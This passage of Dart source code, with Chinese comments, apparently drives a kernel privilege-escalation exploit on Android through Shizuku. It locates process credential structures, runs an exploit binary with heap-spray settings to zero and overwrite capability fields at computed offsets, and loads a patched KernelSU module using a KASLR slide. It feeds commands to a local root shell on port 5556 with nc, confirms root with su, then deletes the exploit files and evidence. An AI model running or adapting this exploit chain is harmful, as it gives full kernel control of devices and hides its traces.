        lastError = '设备已重启（命中后延迟 panic）。等桌面恢复后点「重启」做一次正常重启，再重新运行';
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.permissive, StageStatus.failed, detail: 'permissive 未成功');
    lastError = 'permissive 未成功';
    _advice();
  }

  /// 成功后清理：停 root shell 服务、删掉落盘的原生件与临时/证据文件。
  /// 注意：已 insmod 的模块不受影响；下次运行会在 env 阶段重新部署。
  Future<void> cleanupAfterSuccess() async {
    if (!optCleanup) {
      _log('[clean] 已关闭"成功后清理"，跳过');
      return;
    }
    _log('[clean] 清理残留：停 root shell / 删原生件与临时文件…');
    // ① 停掉 5556 root shell 服务（候选进程会 fork 一个常驻服务）
    await ShizukuShell.run('pkill -x pc');
    await ShizukuShell.run('pkill -x x645');
    // ② 删临时产物（保留 workDir 下的日志到清理前先不删，便于排查）
    final r = await ShizukuShell.run(
      'rm -f /tmp/ksyms.txt /tmp/kt*.ko /data/local/tmp/kt*.ko '
      '/data/local/tmp/ROOTED_* /data/local/tmp/shizuku.log 2>/dev/null; '
      'rm -rf $workDir/pc $workDir/x645 $workDir/ml2 $workDir/ksupatch '
      '$workDir/koquery $workDir/ksu_template.ko $workDir/ksu_run.ko '
      '$workDir/module.ko $workDir/ksyms.bin.gz 2>/dev/null; '
      'ls $workDir 2>/dev/null | tr "\n" " "; echo; echo CLEAN_OK');
    _log('[clean] 剩余（仅日志）：${r.out.split('\n').first}');
  }

  /// 软重启：只重启 Android 框架（zygote/system_server），不动内核
  /// —— KSU 模块还在、SELinux 状态保留，但 App 列表/管理器状态会刷新
  Future<bool> softReboot() async {
    softRebootTried = true;
    _log('[soft] 尝试软重启（ctl.restart zygote）…');
    // 有 root 时优先用 root 通道，成功率更高
    var r = await ShizukuShell.run(
        'su -c "setprop ctl.restart zygote; echo SOFT_OK" 2>&1 | tail -2');
    if (!r.out.contains('SOFT_OK')) {
      r = await ShizukuShell.run('setprop ctl.restart zygote; echo SOFT_OK2');
    }
    final ok = r.out.contains('SOFT_OK');
    _log('[soft] ${ok ? '已发出软重启' : '软重启被拒（${r.all.trim()}）'}');
    if (!ok) {
      _log('[soft] 回退：正常重启（点右上角「重启」，或这里的 reboot）');
    }
    notifyListeners();
    return ok;
  }

  /// 设备健康 / slab 检查（温度、唤醒、内存、posix_timers_cache、cred_jar、SELinux）
  Future<void> refreshHealth() async {
    final r = await ShizukuShell.run(
        'echo "T=\$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)";'
        'echo "W=\$(dumpsys power 2>/dev/null | grep -m1 mWakefulness= | cut -d= -f2)";'
        'echo "M=\$(free -m 2>/dev/null | awk \'/Mem:/{print \$3\"/\"\$2}\')";'
        'echo "P=\$(grep -m1 posix_timers_cache /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
        'echo "C=\$(grep -m1 \"^cred_jar\" /proc/slabinfo 2>/dev/null | awk \'{print \$2\"/\"\$3}\')";'
        'echo "E=\$(getenforce 2>/dev/null)"');
    for (final line in r.out.split('\n')) {
      final i = line.indexOf('=');
      if (i <= 0) continue;
      final k = line.substring(0, i).trim();
      final v = line.substring(i + 1).trim();
      if (k == 'T' || k == 'W' || k == 'M' || k == 'P' || k == 'C' || k == 'E') {
        health[k] = v;
      }
    }
    if (r.via.isNotEmpty && shizukuVia != r.via) {
      shizukuVia = r.via;
      _log('[env] Shizuku 接口: ${r.via == 'api' ? 'Shizuku.newProcess' : 'AIDL newProcess'}');
    }
    notifyListeners();
  }

  Future<bool> _rebooted() async {
    final b = await _bootId();
    if (b.isNotEmpty && bootId.isNotEmpty && b != bootId) {
      bootId = b;
      return true;
    }
    return false;
  }

  Future<void> _runProbe() async {
    _stage(StageId.probe, StageStatus.running);
    phase = '候选进程';
    for (var run = 0; run < 3 && !_stop; run++) {
      final r = await ShizukuShell.run(
          'cd $workDir && rm -f probe.log && chmod 755 pc module.ko && '
          'pkill -x pc 2>/dev/null; '
          'nohup setsid ./pc ${calib.tracepointId} 14 $workDir/module.ko > $workDir/probe.log 2>&1 < /dev/null & echo started');
      _log('[probe] ${r.all}');
      await _sleep(6000);
      final cat = await ShizukuShell.run('cat $workDir/probe.log');
      List<BigInt> creds;
      try {
        creds = _parseCreds(cat.out);
      } catch (e) {
        _log('[probe] 解析失败: $e');
        creds = const <BigInt>[];
      }
      _log('[probe] 捕获 cred ${creds.length} 个');
      for (final c in creds) {
        _log('[probe] cred=${_hex(c)} bit16=${(c >> 16) & BigInt.one}');
      }
      if (creds.isNotEmpty) {
        _stage(StageId.probe, StageStatus.ok, detail: '${creds.length} 个候选');
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.probe, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
    }
    _stage(StageId.probe, StageStatus.failed, detail: '无候选（perf 不可用/未 permissive）');
    lastError = '候选进程没有产出 cred';
    _advice();
  }

  Future<List<BigInt>> _currentCreds() async {
    final cat = await ShizukuShell.run('cat $workDir/probe.log');
    return _parseCreds(cat.out);
  }

  Future<String> _runShot({
    required StageId stage,
    required int stageFrom,
    required int tries,
    String? tryList,
    int timeoutMs = 300000,
  }) async {
    final s = _byId[stage]!;
    s.runs++;
    final logPath = '$workDir/${stage.name}_${_ts()}.log';
    var env = 'P645_STAGE=1 P645_STAGE_FROM=$stageFrom P645_STAGE_TO=2 P645_STAGE_TRIES=$tries '
        'P645_ATTEMPTS=1 P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 '
        'P645_FILL_SELF=0 P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 '
        'P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 '
        'P645_V8=1 P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
        'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
        'P645_THRESH=32 P645_RING_GO=0 P645_LOG=$logPath';
    if (tryList != null && tryList.isNotEmpty) {
      env += " P645_TRY_LIST='$tryList'";
    }
    await ShizukuShell.run(_prepCmd());
    await ShizukuShell.run('pkill -x x645'); // 清掉上一发可能残留的孤儿，避免两份并发污染判据
    _log('[${stage.name}] 开打 tries=$tries');
    final r = await ShizukuShell.run(
      'cd $workDir && $env ./x645 2>&1; echo "RC=\$?"',
      timeoutMs: timeoutMs,
    );
    if (r.all.isNotEmpty) _log(r.all);
    if (r.code == -9) {
      _log('[${stage.name}] 超时，清理残留 x645');
      await ShizukuShell.run('pkill -x x645');
    }
    final lg = await ShizukuShell.run('cat $logPath 2>/dev/null');
    return lg.out;
  }

  Future<void> _runPhase1() async {
    final s = _byId[StageId.phase1]!;
    _stage(StageId.phase1, StageStatus.running);
    phase = 'phase1 cap_bset';
    for (var run = 0; run < 3 && !_stop; run++) {
      final creds = await _currentCreds();
      if (creds.isEmpty) {
        _stage(StageId.phase1, StageStatus.failed, detail: '候选消失');
        return;
      }
      final targets =
        creds
            .take(8)
            .map((c) => _hex(c + BigInt.from(calib.offCapBset)))
            .join(',');
      final lg = await _runShot(
        stage: StageId.phase1,
        stageFrom: 1,
        tries: 8,
        tryList: targets,
      );
      _countTries(lg, phase1OrPhase2: StageId.phase1);
      final v = await _pollVerdict('CAPBND_ZERO', 60);
      if (v != null) {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _log('[phase1] HIT: $v');
        _stage(StageId.phase1, StageStatus.ok, detail: v);
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.phase1, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.phase1, StageStatus.failed, detail: 'cap_bset 未落地');
    lastError = 'cap_bset 未落地';
    _advice();
  }

  Future<void> _runPhase2() async {
    final s = _byId[StageId.phase2]!;
    _stage(StageId.phase2, StageStatus.running);
    phase = 'phase2 cap_effective';
    for (var run = 0; run < 3 && !_stop; run++) {
      final v1 = await _pollVerdict('CAPBND_ZERO', 5, writeLog: false);
      String? cred;
      if (v1 != null) {
        // 取**最后**一条（最新命中），firstMatch 会拿到上一发的旧候选
        final all = RegExp(r'CRED=(0x[0-9a-fA-F]+)').allMatches(v1).toList();
        cred = all.isEmpty ? null : all.last.group(1);
      }
      if (cred == null) {
        final creds = await _currentCreds();
        if (creds.isEmpty) {
          _stage(StageId.phase2, StageStatus.failed, detail: '找不到已清零的候选');
          return;
        }
        cred = _hex(creds.first);
      }
      final c = _fromHex(cred);
      final p = _hex(c + BigInt.from(calib.offCapPermitted));
      final ch = _hex(c + BigInt.from(calib.offCapEffective));
      final list = '3:$p:$ch,3:$p:$ch,3:$p:$ch';
      final lg = await _runShot(
        stage: StageId.phase2,
        stageFrom: 1,
        tries: 5,
        tryList: list,
      );
      _countTries(lg, phase1OrPhase2: StageId.phase2);
      final v = await _pollVerdict('CAPEFF_OK', 90);
      if (v != null) {
        s.hits = s.hits == 0 ? 1 : s.hits;
        _log('[phase2] HIT: $v');
        _stage(StageId.phase2, StageStatus.ok, detail: v);
        _advice();
        return;
      }
      if (await _rebooted()) {
        _stage(StageId.phase2, StageStatus.failed, detail: '设备重启');
        _stop = true;
        return;
      }
      _advice();
    }
    _stage(StageId.phase2, StageStatus.failed, detail: 'cap_effective 未落地');
    lastError = 'cap_effective 未落地';
    _advice();
  }

  Future<String?> _pollVerdict(String pattern, int seconds,
      {bool writeLog = true}) async {
    for (var i = 0; i < seconds; i += 2) {
      if (_stop) return null;
      final r = await ShizukuShell.run(
          'grep -aE "$pattern" $workDir/probe.log 2>/dev/null | tail -2');
      final t = r.out.trim();
      if (t.isNotEmpty) {
        if (writeLog) _log('[verdict] $t');
        return t;
      }
      await _sleep(2000);
    }
    return null;
  }

  Future<void> _runRoot() async {
    _stage(StageId.root, StageStatus.running, detail: '等模块加载…');
    phase = '加载模块';
    final v = await _pollVerdict('ROOT_OK', 90);
    if (v != null) {
      _stage(StageId.root, StageStatus.ok, detail: v.split('\n').last);
      _advice();
      return;
    }
    // 模块没加载：看 probe 日志里的错误
    final r = await ShizukuShell.run(
        'grep -aE "FINIT|INITMOD|TRYLOAD|AFTER_MOD|KLOG" $workDir/probe.log | tail -12');
    if (r.out.trim().isNotEmpty) _log(r.all);
    _stage(StageId.root, StageStatus.failed, detail: '模块未加载');
    lastError = '模块未加载（看日志 FINIT errno）';
    _advice();
  }

  Future<void> _runKsu() async {
    _stage(StageId.ksu, StageStatus.running, detail: '等候选进程自加载…');
    // 首选：候选进程已拿到全 caps，自己在 post_root 里跑 ksupatch + ml2（不依赖 root shell）
    for (var i = 0; i < 12; i++) {
      final n = int.tryParse(
              (await ShizukuShell.run('grep -c ^kernelsu /proc/modules 2>/dev/null'))
                      .out
                      .trim()) ??
          0;
      if (n > 0) {
        _log('[ksu] 候选进程已自行加载 kernelsu（无需 root shell）');
        final sc = await ShizukuShell.run('cat $workDir/ksu_self.log 2>/dev/null | tail -6');
        if (sc.out.trim().isNotEmpty) _log(sc.all);
        _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载（自加载路径）');
        _advice();
        return;
      }
      if (i == 0) _log('[ksu] 等待候选自加载（最多 24s）…');
      await _sleep(2000);
    }
    // 回退：通过 5556 root shell（老路径）
    _stage(StageId.ksu, StageStatus.running, detail: '补丁 + 加载（root shell）…');
    phase = '加载 KernelSU';
    // 注意：ksupatch 的退出码 3 只表示"有 __kcfi_typeid_* 没在 kallsyms 里"（这些是模块自带的
    // 类型哈希，必须保留原值，不是错误）。所以这里不用 && 短路，仍然尝试加载并回报各自 RC。
    final slideHex = calib.textSlide.toRadixString(16);
    final cmd = 'cd $workDir; chmod 755 ksupatch ml2 ksu_template.ko; '
        // ① 常规：读 /proc/kallsyms 真地址（需要能读，通常 root）
        'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; '
        'rm -f ksu_run.ko; ./ksupatch ksu_template.ko ksu_run.ko; echo PATCH_RC=\$?; '
        // ② 兜底：离线符号表 + KASLR slide（不需要 root / 不需要 kptr_restrict）
        'if [ ! -s ksu_run.ko ]; then gzip -dc ksyms.bin.gz > /tmp/ksyms.txt; '
        './ksupatch ksu_template.ko ksu_run.ko --table /tmp/ksyms.txt --slide $slideHex; fi; '
        'echo PATCH_RC2=\$?; '
        './ml2 ksu_run.ko allow_shell=1; echo LOAD_RC=\$?; '
        'grep -c kernelsu /proc/modules; dmesg | grep -i kernelsu | tail -6';
    final r = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
    _log(r.all);
    await _sleep(2000);
    final chk = await ShizukuShell.run('grep -c kernelsu /proc/modules');
    final n = int.tryParse(chk.out.trim()) ?? 0;
    if (n > 0) {
      _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载');
      _advice();
      return;
    }
    final pr = RegExp(r'PATCH_RC=(\d+)').firstMatch(r.out)?.group(1) ?? '?';
    final lr = RegExp(r'LOAD_RC=(\d+)').firstMatch(r.out)?.group(1) ?? '?';
    _stage(StageId.ksu, StageStatus.failed,
        detail: 'kernelsu 未加载（patch_rc=$pr load_rc=$lr）');
    lastError = 'KSU 加载失败：patch_rc=$pr load_rc=$lr（看日志 dmesg）';
    _advice();
  }

  Future<void> _runVerify() async {
    _stage(StageId.verify, StageStatus.running, detail: 'su 验证…');
    phase = '验证 su';
    final r = await ShizukuShell.run('su -c id 2>&1');
    _log('[verify] ${r.all}');
    final okRoot = RegExp(r'uid=0\(root\)').hasMatch(r.out) ||
        r.out.contains('u:r:ksu:s0');
    if (okRoot) {
      _stage(StageId.verify, StageStatus.ok, detail: 'su 可用 · ' + r.all.split('\n').first);
      success = true;
      phase = '越狱成功';
      _log('[verify] 成功：${r.all.split('\n').first}');
      await cleanupAfterSuccess();
      _log('[verify] 若 KernelSU 面板仍显示"未安装/未工作"，先对 KernelSU 清后台或用软重启，再打开它');
    } else {
      _stage(StageId.verify, StageStatus.failed, detail: 'su 不可用');
      lastError = 'su 不可用';
    }
    _advice();
  }

  // ---------------------------------------------------------------- 统计持久化

  Future<void> _loadStats() async {
    for (final e in _prefKey.entries) {
      final raw = await ShizukuShell.getPref('${e.value}.stat');
      if (raw != null && raw.contains('/')) {
        final p = raw.split('/');
        final s = _byId[e.key]!;
        s.tries = int.tryParse(p[0]) ?? 0;
        s.hits = int.tryParse(p[1]) ?? 0;
      }
    }
  }

  Future<void> _saveStats() async {
    for (final e in _prefKey.entries) {
      final s = _byId[e.key]!;
      await ShizukuShell.setPref('${e.value}.stat', '${s.tries}/${s.hits}');
    }
  }
}
